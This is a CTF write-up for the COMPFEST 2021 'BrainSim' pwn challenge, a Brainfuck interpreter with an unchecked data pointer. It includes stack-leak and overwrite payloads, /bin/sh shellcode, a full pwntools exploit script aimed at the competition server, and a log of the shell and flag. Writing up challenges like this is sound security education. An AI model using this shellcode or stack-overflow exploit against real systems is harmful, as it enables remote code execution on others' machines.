## BrainSim

> Points: 500  
>  
> Solves: 1

### Description:  
Heyy! So, I found this BF simulator thing. I thought it's hackable-ish?
Because my friend told me there's flag file in it. Maybe you could help me
while I'm having my breakfast ? Ehehe...

nc 103.152.242.242 29461

Author: xMaximusKl

Hint: Simple BOF using brainfuck, I wonder what you could with that ? Maybe
hanging around in a forbidden place ? :)

### Attachments:  
```  
brainsim-master-public.zip  
```

I was able to start the shell in my local environment but couldn't get the
flag from the server during the competition time.  
After the competition, I managed to start the shell, and when I checked the
binary of the server, the binary of the server and the binary of attachment
were different.

```  
$ ls -l  
total 48  
-rwxr-xr-x 1 0 0 21064 Sep 12 04:47 BrainSim　　　<--- The size is different.  
-rw-r--r-- 1 0 0  2261 Sep 12 04:47 BrainSim.c  
```

When I checked with the administrator on Discord, it seems that the
administrator forgot to update the attachment.

I got the binaries from the server and checked the difference between the two
binaries.  
The following parts of the `Interpret` function are different. There is one
more `getchar()` in the attachment binary.

```  
         case 0x2c:  
           iVar2 = getchar();  
           mem[mp] = (char)iVar2;  
           getchar();                  <----- this part  
           ip = ip + 1;  
           break;  
```

Attach the binary `BrainSim_server` I got from the server.

## Analysis:

This is a challenge with Brainfuck.  
Since NX is disabled, launch the shellcode on the stack BoF.

```  
$ checksec BrainSim  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
```

Brainfuck uses the following variables.  
```  
ip:     Instruction pointer  
ip_end: End position of instruction pointer  
mp:     Data pointer  
brack:  Flag to check the number before and after the bracket  
```

Since the range of the value of data pointer`mp` is not checked when executing
the Brainfuck code, I can read the value on the stack and write arbitrary data
by specifying the following character string.  
```  
.,[>.,]  
```

## Solution:

First I used `.,[>.,]` to leak the stack address (mp = 0 address).

```  
0x7fffffffddb0: 0x0000000000000000      0x0000000000000000  
0x7fffffffddc0: 0x0000000000000000      0x0000000000000000  
0x7fffffffddd0: 0x00007fffffffdee0      0x00007fffffffd5d0　<--- Leak this
0x7fffffffd5d0.  
0x7fffffffdde0: 0x00007fffffffde00      0x00005555555556ed  
0x7fffffffddf0: 0x00007fffffffdee0      0x3100000000000000  
0x7fffffffde00: 0x0000555555555700      0x00007ffff7a03bf7  
```

Then I used `,[>,]` to write the shellcode and then change the return address
of the `Interpret` function to the leaked stack address.

```  
0x7fffffffd5d0: 0x622fb84852d23148      0x485068732f2f6e69  <--- shellcode  
0x7fffffffd5e0: 0x48e689485752e789      0x414141050f3b428d  
0x7fffffffd5f0: 0x4141414141414141      0x4141414141414141  
...  
0x7fffffffddb0: 0x4141414141414141      0x4141414141414141  
0x7fffffffddc0: 0x4141414141414141      0x4141414141414141  
0x7fffffffddd0: 0x4242424242424242      0x4242424242424242  
0x7fffffffdde0: 0x4242424242424242      0x00007fffffffd5d0　<--- Change from
0x5555555556ed to 0x7fffffffd5d0  
0x7fffffffddf0: 0x00007fffffffdee0      0x3100000000000000  
0x7fffffffde00: 0x0000555555555700      0x00007ffff7a03bf7  
```

I can start the shellcode by returning from the `Interpret` function to the
`main` function with the `Exit` function.

## Exploit code:  
```python  
from pwn import *

#context(os='linux', arch='amd64')  
#context.log_level = 'debug'

BINARY = './BrainSim'  
elf  = ELF(BINARY)

shellcode =
'\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

if len(sys.argv) > 1 and sys.argv[1] == 'r':  
 HOST = "103.152.242.242"  
 PORT = 29461  
 s = remote(HOST, PORT)  
 REMOTE = True  
else:  
 s = process(BINARY)  
 libc = elf.libc  
 REMOTE = False

def Interpret_code(code):  
 s.sendlineafter("Input : ", "1")  
 s.sendlineafter("Code : ", code)

def Make_string(s0):  
 s1 = ""  
 for i in range(len(s0)):  
   s1 += s0[i] + s0[i]  
 return s1

if REMOTE:  
 # stack leak  
 Interpret_code(".,[>.,]")  
 s.sendline("A"*0x810+"\x00"*2)

 s.recvuntil("Output: " + "\x00"*0x800)  
 s.recv(8)  
 stack_leak = u64(s.recv(8))  
 print "stack_leak =", hex(stack_leak)

 Interpret_code(",[>,]")  
 buf  = shellcode  
 buf += "A"*(0x800 - len(buf))  
 buf += "B"*0x18  
 buf += p64(stack_leak)  
 s.sendline(buf)

else:  
 # stack leak  
 Interpret_code(".,[>.,]")  
 s.sendline("AA"*0x810+"\x00")

 s.recvuntil("Output: " + "\x00"*0x800)  
 s.recv(8)  
 stack_leak = u64(s.recv(8))  
 print "stack_leak =", hex(stack_leak)

 Interpret_code(",[>,]")  
 buf  = Make_string(shellcode)  
 buf += "AA"*(0x800 - len(buf)/2)  
 buf += "BB"*0x18  
 buf += Make_string(p64(stack_leak)[:-1]) + "\n"  
 s.sendline(buf)

s.interactive()

```

## Results:  
```bash  
mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_BrainSim/brainsim-master-
public/public$ python solve.py r  
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_BrainSim/brainsim-master-
public/public/BrainSim'  
   Arch:     amd64-64-little  
   RELRO:    Full RELRO  
   Stack:    No canary found  
   NX:       NX disabled  
   PIE:      PIE enabled  
   RWX:      Has RWX segments  
[+] Opening connection to 103.152.242.242 on port 29461: Done  
stack_leak = 0x7ffd02a75070  
[*] Switching to interactive mode

Output: $ ls -l  
total 48  
-rwxr-xr-x 1 0 0 21064 Sep 12 04:47 BrainSim  
-rw-r--r-- 1 0 0  2261 Sep 12 04:47 BrainSim.c  
drwxr-xr-x 2 0 0  4096 Sep 12 04:40 bin  
drwxr-xr-x 2 0 0  4096 Sep 12 04:40 dev  
-r--r--r-- 1 0 0    56 Sep 12 04:47 flag.txt  
lrwxrwxrwx 1 0 0     7 Sep 12 04:40 lib -> usr/lib  
lrwxrwxrwx 1 0 0     9 Sep 12 04:40 lib32 -> usr/lib32  
lrwxrwxrwx 1 0 0     9 Sep 12 04:40 lib64 -> usr/lib64  
lrwxrwxrwx 1 0 0    10 Sep 12 04:40 libx32 -> usr/libx32  
-rwxr-xr-x 1 0 0   338 Sep 12 04:47 run.sh  
drwxr-xr-x 6 0 0  4096 Sep 12 04:40 usr  
$ cat flag.txt  
COMPFEST13{570PPPP_I7___937_0U7_0f_my_H34d___b6fc1236d6}  
```

The administrator sent me the Exploit code, so I attach `exploit.py`.  
Thank you for your polite response even after the competition.

## Reference:  
https://en.wikipedia.org/wiki/Brainfuck

https://www.notion.so/RCTF-2020-acfcdd0de8534ed0a7caef3549088281  

Original writeup
(https://github.com/mito753/CTF/tree/main/2021/COMPFEST_CTF_2021/Pwn_BrainSim).